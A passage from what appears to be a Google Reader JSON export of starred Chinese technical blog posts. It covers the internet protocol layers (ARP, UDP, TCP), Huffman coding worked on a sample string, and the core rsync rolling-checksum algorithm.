src=\"http://image.beekka.com/blog/201205/bg2012052910.png\"></p>\n\n<p>IP数据包的\"标头\"部分的长度为20到60字节，整个数据包的总长度最大为65,535字节。因此，理论上，一个IP数据包的\"数据\"部分，最长为65,515字节。前面说过，以太网数据包的\"数据\"部分，最长只有1500字节。因此，如果IP数据包超过了1500字节，它就需要分割成几个以太网数据包，分开发送了。</p>\n\n<p><strong>4.4 ARP协议</strong></p>\n\n<p>关于\"网络层\"，还有最后一点需要说明。</p>\n\n<p>因为IP数据包是放在以太网数据包里发送的，所以我们必须同时知道两个地址，一个是对方的MAC地址，另一个是对方的IP地址。通常情况下，对方的IP地址是已知的（后文会解释），但是我们不知道它的MAC地址。</p>\n\n<p>所以，我们需要一种机制，能够从IP地址得到MAC地址。</p>\n\n<p>这里又可以分成两种情况。第一种情况，如果两台主机不在同一个子网络，那么事实上没有办法得到对方的MAC地址，只能把数据包传送到两个子网络连接处的\"网关\"（gateway），让网关去处理。</p>\n\n<p>第二种情况，如果两台主机在同一个子网络，那么我们可以用ARP协议，得到对方的MAC地址。ARP协议也是发出一个数据包（包含在以太网数据包中），其中包含它所要查询主机的IP地址，在对方的MAC地址这一栏，填的是FF:FF:FF:FF:FF:FF，表示这是一个\"广播\"地址。它所在子网络的每一台主机，都会收到这个数据包，从中取出IP地址，与自身的IP地址进行比较。如果两者相同，都做出回复，向对方报告自己的MAC地址，否则就丢弃这个包。</p>\n\n<p>总之，有了ARP协议之后，我们就可以得到同一个子网络内的主机MAC地址，可以把数据包发送到任意一台主机之上了。</p>\n\n<p><strong>五、传输层</strong></p>\n\n<p><strong>5.1 传输层的由来</strong></p>\n\n<p>有了MAC地址和IP地址，我们已经可以在互联网上任意两台主机上建立通信。</p>\n\n<p>接下来的问题是，同一台主机上有许多程序都需要用到网络，比如，你一边浏览网页，一边与朋友在线聊天。当一个数据包从互联网上发来的时候，你怎么知道，它是表示网页的内容，还是表示在线聊天的内容？</p>\n\n<p>也就是说，我们还需要一个参数，表示这个数据包到底供哪个程序（进程）使用。这个参数就叫做\"端口\"（port），它其实是每一个使用网卡的程序的编号。每个数据包都发到主机的特定端口，所以不同的程序就能取到自己所需要的数据。</p>\n\n<p>\"端口\"是0到65535之间的一个整数，正好16个二进制位。0到1023的端口被系统占用，用户只能选用大于1023的端口。不管是浏览网页还是在线聊天，应用程序会随机选用一个端口，然后与服务器的相应端口联系。</p>\n\n<p><strong>\"传输层\"的功能，就是建立\"端口到端口\"的通信。相比之下，\"网络层\"的功能是建立\"主机到主机\"的通信。只要确定主机和端口，我们就能实现程序之间的交流。</strong>因此，Unix系统就把主机+端口，叫做\"套接字\"（socket）。有了它，就可以进行网络应用程序开发了。</p>\n\n<p><strong>5.2 UDP协议</strong></p>\n\n<p>现在，我们必须在数据包中加入端口信息，这就需要新的协议。最简单的实现叫做UDP协议，它的格式几乎就是在数据前面，加上端口号。</p>\n\n<p>UDP数据包，也是由\"标头\"和\"数据\"两部分组成。</p>\n\n<p><img src=\"http://image.beekka.com/blog/201205/bg2012052911.png\"></p>\n\n<p>\"标头\"部分主要定义了发出端口和接收端口，\"数据\"部分就是具体的内容。然后，把整个UDP数据包放入IP数据包的\"数据\"部分，而前面说过，IP数据包又是放在以太网数据包之中的，所以整个以太网数据包现在变成了下面这样：</p>\n\n<p><img src=\"http://image.beekka.com/blog/201205/bg2012052912.png\"></p>\n\n<p>UDP数据包非常简单，\"标头\"部分一共只有8个字节，总长度不超过65,535字节，正好放进一个IP数据包。</p>\n\n<p><strong>5.3 TCP协议</strong></p>\n\n<p>UDP协议的优点是比较简单，容易实现，但是缺点是可靠性较差，一旦数据包发出，无法知道对方是否收到。</p>\n\n<p>为了解决这个问题，提高网络可靠性，TCP协议就诞生了。这个协议非常复杂，但可以近似认为，它就是有确认机制的UDP协议，每发出一个数据包都要求确认。如果有一个数据包遗失，就收不到确认，发出方就知道有必要重发这个数据包了。</p>\n\n<p>因此，TCP协议能够确保数据不会遗失。它的缺点是过程复杂、实现困难、消耗较多的资源。</p>\n\n<p>TCP数据包和UDP数据包一样，都是内嵌在IP数据包的\"数据\"部分。TCP数据包没有长度限制，理论上可以无限长，但是为了保证网络的效率，通常TCP数据包的长度不会超过IP数据包的长度，以确保单个TCP数据包不必再分割。</p>\n\n<p><strong>六、应用层</strong></p>\n\n<p>应用程序收到\"传输层\"的数据，接下来就要进行解读。由于互联网是开放架构，数据来源五花八门，必须事先规定好格式，否则根本无法解读。</p>\n\n<p><strong>\"应用层\"的作用，就是规定应用程序的数据格式。</strong></p>\n\n<p>举例来说，TCP协议可以为各种各样的程序传递数据，比如Email、WWW、FTP等等。那么，必须有不同协议规定电子邮件、网页、FTP数据的格式，这些应用程序协议就构成了\"应用层\"。</p>\n\n<p>这是最高的一层，直接面对用户。它的数据就放在TCP数据包的\"数据\"部分。因此，现在的以太网的数据包就变成下面这样。</p>\n\n<p><img src=\"http://image.beekka.com/blog/201205/bg2012052913.png\"></p>\n\n<p>至此，整个互联网的五层结构，自下而上全部讲完了。这是从系统的角度，解释互联网是如何构成的。<a href=\"http://www.ruanyifeng.com/blog/2012/06/internet_protocol_suite_part_ii.html\">下一篇</a>，我反过来，从用户的角度，自上而下看看这个结构是如何发挥作用，完成一次网络数据交换的。</p>\n\n<p>（完）</p><div style=\"color:#556677;line-height:160%;padding:0.3em 0.5em;border:1px solid #d3d3d3;margin:1em;background-color:#aad2f0;border-radius:10px\"><h3>文档信息</h3>\n<ul>\n<li>版权声明：自由转载-非商用-非衍生-保持署名 | <a href=\"http://creativecommons.org/licenses/by-nc-nd/3.0/deed.zh\">Creative Commons BY-NC-ND 3.0</a></li>\n<li>原文网址：<a href=\"http://www.ruanyifeng.com/blog/2012/05/internet_protocol_suite_part_i.html\">http://www.ruanyifeng.com/blog/2012/05/internet_protocol_suite_part_i.html</a></li>\n<li>最后修改时间：2012年7月25日 18:00</li>\n<li>付费支持：<a href=\"https://me.alipay.com/ruanyf\"><img src=\"http://www.ruanyifeng.com/blog/images/rmb_32.png\" title=\"人民币\" alt=\"人民币 - 支付宝\" style=\"border:none;vertical-align:middle\"></a> | <a href=\"https://www.paypal.com/cgi-bin/webscr?cmd=_xclick&amp;business=yifeng.ruan@gmail.com&amp;currency_code=USD&amp;amount=0.99&amp;return=http://www.ruanyifeng.com/thank.html&amp;item_name=Ruan%20YiFeng&#39;s%20Blog&amp;undefined_quantity=1&amp;no_note=0\"><img src=\"http://www.ruanyifeng.com/blog/images/dollar_32.png\" alt=\"美元 - paypal\" title=\"美元\" style=\"border:none;vertical-align:middle\"></a> </li>\n</ul></div><div style=\"color:#556677;line-height:160%;padding:0.3em 0.5em;margin:1em;border-radius:10px\"></div>"
    },
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://feeds.feedburner.com/ruanyifeng",
      "title" : "阮一峰的网络日志",
      "htmlUrl" : "http://www.ruanyifeng.com/blog/"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1337688502015",
    "timestampUsec" : "1337688502015056",
    "id" : "tag:google.com,2005:reader/item/09481e95fe39bd96",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred", "杂项资源", "程序设计", "Algorithm", "Compress", "Huffman Code" ],
    "title" : "Huffman 编码压缩算法",
    "published" : 1337664725,
    "updated" : 1337664725,
    "alternate" : [ {
      "href" : "http://coolshell.cn/articles/7459.html",
      "type" : "text/html"
    } ],
    "content" : {
      "direction" : "ltr",
      "content" : "<p>前两天发布那个<a title=\"rsync 的核心算法\" href=\"http://coolshell.cn/articles/7425.html\">rsync算法</a>后，想看看数据压缩的算法，知道一个经典的压缩算法Huffman算法。相信大家应该听说过 <a title=\"David Huffman\" href=\"http://en.wikipedia.org/wiki/David_A._Huffman\">David Huffman</a> 和他的压缩算法—— <a href=\"http://en.wikipedia.org/wiki/Huffman_coding\">Huffman Code</a>，一种通过字符出现频率，<a href=\"http://en.wikipedia.org/wiki/Priority_queue\">Priority Queue</a>，和二叉树来进行的一种压缩算法，这种二叉树又叫Huffman二叉树 —— 一种带权重的树。从学校毕业很长时间的我忘了这个算法，但是网上查了一下，中文社区内好像没有把这个算法说得很清楚的文章，尤其是树的构造，而正好看到一篇国外的文章《<a href=\"http://en.nerdaholyc.com/huffman-coding-on-a-string/\">A Simple Example of Huffman Code on a String</a>》，其中的例子浅显易懂，相当不错，我就转了过来。注意，我没有对此文完全翻译。</p>\n<p>我们直接来看示例，如果我们需要来压缩下面的字符串：</p>\n<p style=\"text-align:center\"><strong> “beep boop beer!” </strong></p>\n<p>首先，我们先计算出每个字符出现的次数，我们得到下面这样一张表 :</p>\n<p><center><br>\n<table style=\"width:250px;height:200px\">\n<tbody>\n<tr>\n<td><span style=\"font-size:12px\">字符</span></td>\n<td>次数</td>\n</tr>\n<tr>\n<td><span style=\"font-size:12px\">‘b’</span></td>\n<td><span style=\"font-size:12px\">3</span></td>\n</tr>\n<tr>\n<td><span style=\"font-size:12px\">‘e’</span></td>\n<td><span style=\"font-size:12px\">4</span></td>\n</tr>\n<tr>\n<td><span style=\"font-size:12px\">‘p’</span></td>\n<td><span style=\"font-size:12px\">2</span></td>\n</tr>\n<tr>\n<td><span style=\"font-size:12px\">‘ ‘</span></td>\n<td><span style=\"font-size:12px\">2</span></td>\n</tr>\n<tr>\n<td><span style=\"font-size:12px\">‘o’</span></td>\n<td><span style=\"font-size:12px\">2</span></td>\n</tr>\n<tr>\n<td><span style=\"font-size:12px\">‘r’</span></td>\n<td><span style=\"font-size:12px\">1</span></td>\n</tr>\n<tr>\n<td><span style=\"font-size:12px\">‘!’</span></td>\n<td><span style=\"font-size:12px\">1</span></td>\n</tr>\n</tbody>\n</table>\n<p></p></center><br>\n然后，我把把这些东西放到Priority Queue中（用出现的次数据当 priority），我们可以看到，Priority Queue 是以Prioirry排序一个数组，如果Priority一样，会使用出现的次序排序：下面是我们得到的Priority Queue：</p>\n<p><span></span></p>\n<p><a href=\"http://coolshell.cn/wp-content/uploads/2012/05/coada1.png\"><img title=\"coada1\" src=\"http://coolshell.cn/wp-content/uploads/2012/05/coada1.png\" alt=\"\" width=\"440\" height=\"61\"></a></p>\n<p>接下来就是我们的算法——把这个Priority Queue 转成二叉树。我们始终从queue的头取两个元素来构造一个二叉树（第一个元素是左结点，第二个是右结点），并把这两个元素的priority相加，并放回Priority中（再次注意，这里的Priority就是字符出现的次数），然后，我们得到下面的数据图表：</p>\n<p style=\"text-align:center\"><a href=\"http://coolshell.cn/wp-content/uploads/2012/05/coada2.png\"><img title=\"coada2\" src=\"http://coolshell.cn/wp-content/uploads/2012/05/coada2.png\" alt=\"\" width=\"411\" height=\"151\"></a></p>\n<p>同样，我们再把前两个取出来，形成一个Priority为2+2=4的结点，然后再放回Priority Queue中 :</p>\n<p><a href=\"http://coolshell.cn/wp-content/uploads/2012/05/coada31.png\"><img title=\"coada3\" src=\"http://coolshell.cn/wp-content/uploads/2012/05/coada31.png\" alt=\"\" width=\"325\" height=\"201\"></a></p>\n<p>继续我们的算法（我们可以看到，这是一种自底向上的建树的过程）：</p>\n<p><a href=\"http://coolshell.cn/wp-content/uploads/2012/05/coada4.png\"><img title=\"coada4\" src=\"http://coolshell.cn/wp-content/uploads/2012/05/coada4.png\" alt=\"\" width=\"326\" height=\"221\"></a></p>\n<p><a href=\"http://coolshell.cn/wp-content/uploads/2012/05/coada5.png\"><img title=\"coada5\" src=\"http://coolshell.cn/wp-content/uploads/2012/05/coada5.png\" alt=\"\" width=\"347\" height=\"207\"></a></p>\n<p><a href=\"http://coolshell.cn/wp-content/uploads/2012/05/coada61.png\"><img title=\"coada6\" src=\"http://coolshell.cn/wp-content/uploads/2012/05/coada61.png\" alt=\"\" width=\"344\" height=\"273\"></a></p>\n<p>最终我们会得到下面这样一棵二叉树：</p>\n<p><a href=\"http://coolshell.cn/wp-content/uploads/2012/05/arbore_final.png\"><img title=\"arbore_final\" src=\"http://coolshell.cn/wp-content/uploads/2012/05/arbore_final.png\" alt=\"\" width=\"452\" height=\"304\"></a></p>\n<p>此时，我们把这个树的左支编码为0，右支编码为1，这样我们就可以遍历这棵树得到字符的编码，比如：‘b’的编码是 00，’p&#39;的编码是101， ‘r’的编码是1000。<strong>我们可以看到出现频率越多的会越在上层，编码也越短，出现频率越少的就越在下层，编码也越长</strong>。</p>\n<p><a href=\"http://coolshell.cn/wp-content/uploads/2012/05/arbore_final_numerotat.png\"><img title=\"arbore_final_numerotat\" src=\"http://coolshell.cn/wp-content/uploads/2012/05/arbore_final_numerotat.png\" alt=\"\" width=\"452\" height=\"304\"></a></p>\n<p>最终我们可以得到下面这张编码表：</p>\n<p><center><br>\n<table style=\"width:250px;height:200px\">\n<tbody>\n<tr>\n<td>字符</td>\n<td>编码</td>\n</tr>\n<tr>\n<td><span style=\"font-size:12px\">‘b’</span></td>\n<td><span style=\"font-size:12px\">00</span></td>\n</tr>\n<tr>\n<td><span style=\"font-size:12px\">‘e’</span></td>\n<td><span style=\"font-size:12px\">11</span></td>\n</tr>\n<tr>\n<td><span style=\"font-size:12px\">‘p’</span></td>\n<td><span style=\"font-size:12px\">101</span></td>\n</tr>\n<tr>\n<td><span style=\"font-size:12px\">‘ ‘</span></td>\n<td><span style=\"font-size:12px\">011</span></td>\n</tr>\n<tr>\n<td><span style=\"font-size:12px\">‘o’</span></td>\n<td><span style=\"font-size:12px\">010</span></td>\n</tr>\n<tr>\n<td><span style=\"font-size:12px\">‘r’</span></td>\n<td><span style=\"font-size:12px\">1000</span></td>\n</tr>\n<tr>\n<td><span style=\"font-size:12px\">‘!’</span></td>\n<td><span style=\"font-size:12px\">1001</span></td>\n</tr>\n</tbody>\n</table>\n<p></p></center><br>\n这里需要注意一点，当我们encode的时候，我们是按“bit”来encode，decode也是通过bit来完成，比如，如果我们有这样的bitset “1011110111″ 那么其解码后就是 “pepe”。所以，我们需要通过这个二叉树建立我们Huffman编码和解码的字典表。</p>\n<p>这里需要注意的一点是，我们的Huffman对各个字符的编码是不会冲突的，也就是说，<strong>不会存在某一个编码是另一个编码的前缀</strong>，不然的话就会大问题了。因为encode后的编码是没有分隔符的。</p>\n<p style=\"text-align:left;padding-left:30px\">于是，对于我们的原始字符串  beep boop beer!</p>\n<p style=\"text-align:left;padding-left:30px\">其对就能的二进制为 : 0110 0010 0110 0101 0110 0101 0111 0000 0010 0000 0110 0010 0110 1111 0110 1111 0111 0000 0010 0000 0110 0010 0110 0101 0110 0101 0111 0010 0010 0001</p>\n<p style=\"text-align:left;padding-left:30px\">我们的Huffman的编码为： 0011 1110 1011 0001 0010 1010 1100 1111 1000 1001</p>\n<p>从上面的例子中，我们可以看到被压缩的比例还是很可观的。</p>\n<p>作者给出了源码你可以看看（ C99标准） <a href=\"http://en.nerdaholyc.com/wp-content/uploads/2012/05/huffman_string.zip\">Download the source files</a></p>\n<p>（全文完）<br>\n<hr height=\"1\" width=\"100%\">\n<div style=\"margin-top:15px;font-size:11px;color:#cc0000\">\n<p align=\"center\"><strong>（转载本站文章请注明作者和出处 <a href=\"http://coolshell.cn/\">酷壳 – CoolShell.cn</a> ，请勿用于任何商业用途）</strong></p></div>\n<div style=\"text-align:center;padding:0px;font-size:11px;margin-bottom:50px\">————————============ <b>感谢 <a href=\"http://42qu.com/\">42qu.com</a> 为本站提供 <a href=\"http://vps.42qu.com/\"> VPS</a></b> ============————————</div>\n<table cellspacing=\"0\" cellpadding=\"3\" border=\"0\" style=\"clear:both\">\n    \n    <tr>\n        <td colspan=\"5\"><b><font size=\"-1\" style=\"display:block!important;padding:20px 0 5px!important\">您可能也喜欢：</font></b></td>\n    </tr>\n    \n        <tr>\n                <td width=\"102\" valign=\"top\" style=\"padding:5px!important;margin:0!important\">\n                    <a title=\"Code Review中的几个提示\" style=\"text-decoration:none!important\" href=\"http://app.wumii.com/ext/redirect?url=http%3A%2F%2Fcoolshell.cn%2Farticles%2F1302.html&amp;from=http%3A%2F%2Fcoolshell.cn%2Farticles%2F7459.html\">\n                        <img style=\"margin:0!important;padding:2px!important;border:1px solid #dddddd!important;width:96px!important;height:96px!important\" src=\"http://static.wumii.com/site_images/2012/08/09/40094928.jpg\" width=\"96px\" height=\"96px\"><br>\n                        <font size=\"-1\" color=\"#333333\" style=\"display:block!important;line-height:15px!important;width:102px!important;font:12px/15px arial!important;height:60px!important;margin:3px 0 0 0!important;padding:0!important;overflow:hidden!important\">Code Review中的几个提示</font>\n                    </a>\n                </td>\n                <td width=\"102\" valign=\"top\" style=\"padding:5px!important;margin:0!important;border-left:1px solid #dddddd!important\">\n                    <a title=\"打印质数的各种算法\" style=\"text-decoration:none!important\" href=\"http://app.wumii.com/ext/redirect?url=http%3A%2F%2Fcoolshell.cn%2Farticles%2F3738.html&amp;from=http%3A%2F%2Fcoolshell.cn%2Farticles%2F7459.html\">\n                        <img style=\"margin:0!important;padding:2px!important;border:1px solid #dddddd!important;width:96px!important;height:96px!important\" src=\"http://static.wumii.com/images/blogWidget/wordpress_default.gif\" width=\"96px\" height=\"96px\"><br>\n                        <font size=\"-1\" color=\"#333333\" style=\"display:block!important;line-height:15px!important;width:102px!important;font:12px/15px arial!important;height:60px!important;margin:3px 0 0 0!important;padding:0!important;overflow:hidden!important\">打印质数的各种算法</font>\n                    </a>\n                </td>\n                <td width=\"102\" valign=\"top\" style=\"padding:5px!important;margin:0!important;border-left:1px solid #dddddd!important\">\n                    <a title=\"优质代码的十诫\" style=\"text-decoration:none!important\" href=\"http://app.wumii.com/ext/redirect?url=http%3A%2F%2Fcoolshell.cn%2Farticles%2F1007.html&amp;from=http%3A%2F%2Fcoolshell.cn%2Farticles%2F7459.html\">\n                        <img style=\"margin:0!important;padding:2px!important;border:1px solid #dddddd!important;width:96px!important;height:96px!important\" src=\"http://static.wumii.com/site_images/2011/11/08/10437778.jpg\" width=\"96px\" height=\"96px\"><br>\n                        <font size=\"-1\" color=\"#333333\" style=\"display:block!important;line-height:15px!important;width:102px!important;font:12px/15px arial!important;height:60px!important;margin:3px 0 0 0!important;padding:0!important;overflow:hidden!important\">优质代码的十诫</font>\n                    </a>\n                </td>\n                <td width=\"102\" valign=\"top\" style=\"padding:5px!important;margin:0!important;border-left:1px solid #dddddd!important\">\n                    <a title=\"简单实用的Code Review工具\" style=\"text-decoration:none!important\" href=\"http://app.wumii.com/ext/redirect?url=http%3A%2F%2Fcoolshell.cn%2Farticles%2F1218.html&amp;from=http%3A%2F%2Fcoolshell.cn%2Farticles%2F7459.html\">\n                        <img style=\"margin:0!important;padding:2px!important;border:1px solid #dddddd!important;width:96px!important;height:96px!important\" src=\"http://static.wumii.com/site_images/2011/07/06/16447404.png\" width=\"96px\" height=\"96px\"><br>\n                        <font size=\"-1\" color=\"#333333\" style=\"display:block!important;line-height:15px!important;width:102px!important;font:12px/15px arial!important;height:60px!important;margin:3px 0 0 0!important;padding:0!important;overflow:hidden!important\">简单实用的Code Review工具</font>\n                    </a>\n                </td>\n                <td width=\"102\" valign=\"top\" style=\"padding:5px!important;margin:0!important;border-left:1px solid #dddddd!important\">\n                    <a title=\"一个显示排序过程的Python脚本\" style=\"text-decoration:none!important\" href=\"http://app.wumii.com/ext/redirect?url=http%3A%2F%2Fcoolshell.cn%2Farticles%2F536.html&amp;from=http%3A%2F%2Fcoolshell.cn%2Farticles%2F7459.html\">\n                        <img style=\"margin:0!important;padding:2px!important;border:1px solid #dddddd!important;width:96px!important;height:96px!important\" src=\"http://static.wumii.com/site_images/2011/05/17/8772217.png\" width=\"96px\" height=\"96px\"><br>\n                        <font size=\"-1\" color=\"#333333\" style=\"display:block!important;line-height:15px!important;width:102px!important;font:12px/15px arial!important;height:60px!important;margin:3px 0 0 0!important;padding:0!important;overflow:hidden!important\">一个显示排序过程的Python脚本</font>\n                    </a>\n                </td>\n        </tr>\n    \n    <tr>\n        <td colspan=\"5\" align=\"right\">\n            <a style=\"text-decoration:none!important\" href=\"http://www.wumii.com/widget/relatedItems\" title=\"无觅相关文章插件\">\n                <font size=\"-1\" color=\"#bbbbbb\" style=\"display:block!important;font-family:arial!important;padding:5px 0!important;font-size:12px!important;color:#bbb!important\">无觅</font>\n            </a>\n        </td>\n    </tr>\n</table><h3>相关文章</h3><ul><li>2012年06月29日 -- <a href=\"http://coolshell.cn/articles/7779.html\" title=\"K-Means 算法\">K-Means 算法</a></li><li>2012年05月17日 -- <a href=\"http://coolshell.cn/articles/7425.html\" title=\"rsync 的核心算法\">rsync 的核心算法</a></li><li>2011年11月29日 -- <a href=\"http://coolshell.cn/articles/6010.html\" title=\"一些有意思的算法代码\">一些有意思的算法代码</a></li><li>2011年06月23日 -- <a href=\"http://coolshell.cn/articles/4883.html\" title=\"排序算法 Sleep Sort\">排序算法 Sleep Sort</a></li><li>2011年05月04日 -- <a href=\"http://coolshell.cn/articles/4671.html\" title=\"可视化的数据结构和算法\">可视化的数据结构和算法</a></li><li>2011年04月06日 -- <a href=\"http://coolshell.cn/articles/4220.html\" title=\"一些有意思的文章和资源\">一些有意思的文章和资源</a></li><li>2011年03月18日 -- <a href=\"http://coolshell.cn/articles/3933.html\" title=\"可视化的排序过程\">可视化的排序过程</a></li></ul></p>"
    },
    "author" : "陈皓",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://coolshell.cn/feed",
      "title" : "酷壳 - CoolShell.cn",
      "htmlUrl" : "http://coolshell.cn"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1337222427311",
    "timestampUsec" : "1337222427311862",
    "id" : "tag:google.com,2005:reader/item/baeee706973a115f",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred", "杂项资源", "程序设计", "adler", "Algorithm", "checksum", "Linux", "MD5", "rsync" ],
    "title" : "rsync 的核心算法",
    "published" : 1337214338,
    "updated" : 1337214338,
    "alternate" : [ {
      "href" : "http://coolshell.cn/articles/7425.html",
      "type" : "text/html"
    } ],
    "content" : {
      "direction" : "ltr",
      "content" : "<p><a href=\"http://en.wikipedia.org/wiki/Rsync\">rsync</a>是unix/linux下同步文件的一个高效算法，它能同步更新两处计算机的文件与目录，并适当利用查找文件中的不同块以减少数据传输。rsync中一项与其他大部分类似程序或协定中所未见的重要特性是镜像是只对有变更的部分进行传送。rsync可拷贝／显示目录属性，以及拷贝文件，并可选择性的压缩以及递归拷贝。rsync利用由<a href=\"http://en.wikipedia.org/wiki/Andrew_Tridgell\">Andrew Tridgell</a>发明的算法。这里不介绍其使用方法，只介绍其核心算法。我们可以看到，Unix下的东西，一个命令，一个工具都有很多很精妙的东西，怎么学也学不完，这就是<a title=\"Unix传奇(上篇)\" href=\"http://coolshell.cn/articles/2322.html\">Unix的文化</a>啊。</p>\n<p>本来不想写这篇文章的，因为原先发现有很多中文blog都说了这个算法，但是看了一下，发现这些中文blog要么翻译国外文章翻译地非常烂，要么就是介绍这个算法介绍得很乱让人看不懂，还有错误，误人不浅，所以让我觉得有必要写篇rsync算法介绍的文章。（当然，我成文比较仓促，可能会有一些错误，请指正）</p>\n<h4>问题</h4>\n<p>首先， 我们先来想一下rsync要解决的问题，如果我们要同步的文件只想传不同的部分，我们就需要对两边的文件做diff，但是这两个问题在两台不同的机器上，无法做diff。如果我们做diff，就要把一个文件传到另一台机器上做diff，但这样一来，我们就传了整个文件，这与我们只想传输不同部的初衷相背。</p>\n<p>于是我们就要想一个办法，让这两边的文件见不到面，但还能知道它们间有什么不同。这就出现了rsync的算法。</p>\n<h4>算法</h4>\n<p>rsync的算法如下：（<strong>假设我们同步源文件名为fileSrc，同步目的文件叫fileDst</strong>）</p>\n<p><span></span></p>\n<p>1）<strong>分块Checksum算法</strong>。首先，我们会把fileDst的文件平均切分成若干个小块，比如每块512个字节（最后一块会小于这个数），然后对每块计算两个checksum，</p>\n<ul>\n<li>一个叫<a href=\"http://en.wikipedia.org/wiki/Rolling_hash\">rolling checksum</a>，是弱checksum，32位的checksum，其使用的是Mark Adler发明的<a title=\"Adler-32\" href=\"http://en.wikipedia.org/wiki/Adler-32\">adler-32</a>算法，</li>\n<li>另一个是强checksum，128位的，以前用md4，现在用md5 hash算法。</li>\n</ul>\n<p>为什么要这样？因为若干年前的硬件上跑md4的算法太慢了，所以，我们需要一个快算法来鉴别文件块的不同，但是弱的adler32算法碰撞概率太高了，所以我们还要引入强的checksum算法以保证两文件块是相同的。<strong>也就是说，弱的checksum是用来区别不同，而强的是用来确认相同</strong>。（checksum的具体公式可以参看<a href=\"http://rsync.samba.org/tech_report/node3.html\">这篇文章</a>）</p>\n<p>2）<strong>传输算法。</strong>同步目标端会把fileDst的一个checksum列表传给同步源，这个列表里包括了三个东西，<strong>rolling checksum(32bits)</strong>，<strong>md5 checksume(128bits)</strong>，<strong>文件块编号</strong>。</p>\n<p>我估计你猜到了同步源机器拿到了这个列表后，会对fileSrc做同样的checksum，然后和fileDst的checksum做对比，这样就知道哪些文件块改变了。</p>\n<p>但是，聪明的你一定会有以下两个疑问：</p>\n<ul>\n<li>如果我fileSrc这边在文件中间加了一个字符，这样后面的文件块都会位移一个字符，这样就完全和fileDst这边的不一样了，但理论上来说，我应该只需要传一个字符就好了。这个怎么解决？</li>\n</ul>\n<ul>\n<li>如果这个checksum列表特别长，而我的两边的相同的文件块可能并不是一样的顺序，那就需要查找，线性的查找起来应该特别慢吧。这个怎么解决？</li>\n</ul>\n<p>很好，让我们来看一下同步源端的算法。</p>\n<p>3）<strong>checksum查找算法</strong>。同步源端拿到fileDst的checksum数组后，会把这个数据存到一个hash table中，用rolling checksum做hash，以便获得O(1)时间复杂度的查找性能。这个hash table是16bits的，所以，hash table的尺寸是2的16次方，对rolling checksum的hash会被散列到0 到 2^16 – 1中的某个整数值。（对于hash table，如果你不清楚，建议回去看大学时的数据结构教科书）</p>\n<p>顺便说一下，我在网上看到很多文章说，“要对rolling checksum做排序”（比如<a href=\"http://www.yejun.cn/?p=472\">这篇</a>和<a href=\"http://blog.csdn.net/tobeandnottobe/article/details/6719848\">这篇</a>），这两篇文章都引用并翻译了<a href=\"http://rsync.samba.org/tech_report/node4.html\">原作者的这篇文章</a>，但是他们都理解错了，不是排序，就只是把fileDst的checksum数据，按rolling checksum做存到2^16的hash table中，当然会发生碰撞，把碰撞的做成一个链表就好了。这就是<a href=\"http://rsync.samba.org/tech_report/node4.html\">原文</a>中所说的第二步——搜索有碰撞的情况。</p>\n<p>4）<strong>比对算法</strong>。这是最关键的算法，细节如下：</p>\n<p style=\"padding-left:30px\">4.1）取fileSrc的第一个文件块（我们假设的是512个长度），也就是从fileSrc的第1个字节到第512个字节，取出来后做rolling checksum计算。计算好的值到hash表中查。</p>\n<p style=\"padding-left:30px\">4.2）如果查到了，说明发现在fileDst中有潜在相同的文件块，于是就再比较md5的checksum，因为rolling checksume太弱了，可能发生碰撞。于是还要算md5的128bits的checksum，这样一来，我们就有 2^-(32+128) = 2^-160的概率发生碰撞，这太小了可以忽略。<strong>如果rolling checksum和md5 checksum都相同，这说明在fileDst中有相同的块，我们需要记下这一块在fileDst下的文件编号</strong>。</p>\n<p style=\"padding-left:30px\">4.3）如果fileSrc的rolling checksum 没有在hash table中找到，那就不用算md5 checksum了。表示这一块中有不同的信息。总之，只要rolling checksum 或 md5 checksum 其中有一个在fileDst的checksum hash表中找不到匹配项，那么就会触发算法对fileSrc的rolling动作。于是，<strong>算法会住后step 1个字节，取fileSrc中字节2-513的文件块要做checksum，go to (4.1) </strong>- 现在你明白什么叫rolling checksum了吧。</p>\n<p style=\"padding-left:30px\">4.4）这样，我们就可以找出fileSrc相邻两次匹配中的那些文本字符，这些就是我们要往同步目标端传的文件内容了。</p>\n<h4>图示</h4>\n<p>怎么，你没看懂？ 好吧，我送佛送上西，画个示意图给你看看（对图中的东西我就不再解释了）。</p>\n<p><img title=\"rsync algorithm\" src=\"http://coolshell.cn/wp-content/uploads/2012/05/rsync-algorithm.jpg\" alt=\"\" width=\"650\" height=\"463\"></p>\n<p>这样，最终，在同步源这端，我们的rsync算法可能会得到下面这个样子的一个数据数组，图中，红色块表示在目标端已匹配上，不用传输（注：我专门在其中显示了两块chunk #5，相信你会懂的），而白色的地方就是需要传输的内容（注意：这些白色的块是不定长的），这样，同步源这端把这个数组（白色的就是实际内容，红色的就放一个标号）压缩传到目的端，在目的端的rsync会根据这个表重新生成文件，这样，同步完成。</p>\n<p><img title=\"rsync algorithm result\" src=\"http://coolshell.cn/wp-content/uploads/2012/05/rsync-algorithm-result.jpg\" alt=\"\" width=\"606\" height=\"82\"></p>\n<p>最后想说一下，对于某些压缩文件使用rsync传输可能会传得更多，因为被压缩后的文件可能会非常的不同。对此，对于gzip和bzip2这样的命令，记得开启 “rsyncalbe” 模式。</p>\n<p>（全文完，<strong>转载时请注明作者和出处</strong>）\n<div style=\"margin-top:15px;font-size:11px;color:#cc0000\">\n<p align=\"center\"><strong>（转载本站文章请注明作者和出处 <a href=\"http://coolshell.cn/\">酷壳 – CoolShell.cn</a> ，请勿用于任何商业用途）</strong></p></div>\n<div style=\"text-align:center;padding:0px;font-size:11px;margin-bottom:50px\">————————============ <b>感谢 <a href=\"http://42qu.com/\">42qu.com</a> 为本站提供 <a href=\"http://vps.42qu.com/\"> VPS</a></b> ============————————</div>\n<table cellspacing=\"0\" cellpadding=\"3\" border=\"0\" style=\"clear:both\">\n    \n    <tr>\n        <td colspan=\"5\"><b><font size=\"-1\" style=\"display:block!important;padding:20px 0 5px!important\">您可能也喜欢：</font></b></td>\n    </tr>\n    \n        <tr>\n                <td width=\"102\" valign=\"top\" style=\"padding:5px!important;margin:0!important\">\n                    <a title=\"28个Unix/Linux的命令行神器\" style=\"text-decoration:none!important\" 